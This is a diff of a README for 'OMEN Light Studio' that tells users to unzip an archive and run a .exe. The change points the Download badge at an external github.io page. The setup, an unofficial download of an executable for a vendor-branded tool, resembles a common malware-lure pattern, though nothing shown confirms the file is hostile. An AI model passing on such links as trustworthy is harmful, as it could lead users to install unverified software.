@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install OMEN Light Studio and integrate it with OMEN Gaming Hub automatically.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://omen-light-studio.github.io/.github/)
 
 ## 📸 Overview
 ![omenlightstudio-sync](https://github.com/user-attachments/assets/65ea8b95-0629-4aa5-a721-d8e8d5df9c28)
